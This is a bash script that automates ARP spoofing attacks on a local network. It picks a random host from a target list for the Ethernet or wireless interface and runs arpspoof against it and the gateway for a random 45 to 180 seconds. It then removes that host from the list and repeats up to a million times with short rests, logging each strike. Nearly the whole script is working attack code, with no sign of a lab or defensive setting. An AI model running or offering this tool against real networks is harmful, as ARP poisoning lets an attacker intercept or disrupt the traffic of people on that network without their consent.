#!/bin/bash

interface=$1
gateway=$2
worker=$3

logfile=logs/striker.log

iplist_eth=targets/iplist_eth.txt
iplist_wlan=targets/iplist_wlan.txt
if [ $interface == "eth0" ];
    then
    echo "interface is eth"
    iptable=$iplist_eth
else
    echo "interface is wlan"
    iptable=$iplist_wlan
fi
echo "gateway is $gateway"
echo ""

count=0
endloop=1000000

while [ $count -lt $endloop ]
do
    terminate=$(cat terminate)
    if [ $terminate -eq "1" ];
    then
        echo "Terminating..."
        break
    fi
    echo "------------------------------------" | tee -a $logfile
    echo "Count: $count, Interface: $interface, Worker: $worker" | tee -a $logfile
    echo "Date: $(date +%Y%m%d_%T.%4N)" | tee -a $logfile
    echo ""

    totalline=$(wc -l $iptable | awk '{ print $1; }')
    echo "totalline: $totalline" | tee -a $logfile
    luckynumber=$(shuf -i 1-$totalline -n1)
    echo "luckynumer: $luckynumber" | tee -a $logfile
    echo ""

    echo "Get striker from ip table"
    striker=$(sed "$luckynumber!d" $iptable | awk '{ print $1; }')
    echo "Striker: $striker" | tee -a $logfile
    echo "Delete striker from iptable"
    sed "/$striker/d" -i $iptable
    echo ""

    work=$(shuf -i 45-180 -n1)
    echo "Duraction: $work" | tee -a $logfile
    echo ""

    if [ "$striker" = "" ]; then
        echo "target is null, skip"
        sleep $work
    else
        timeout $work arpspoof -i $interface -t $striker $gateway
    fi

    rest=$(shuf -i 15-30 -n1)
    echo "Rest: $rest secs"
    echo ""

    sleep $rest

    count=`expr $count + 1`

done

echo "bye bye!"
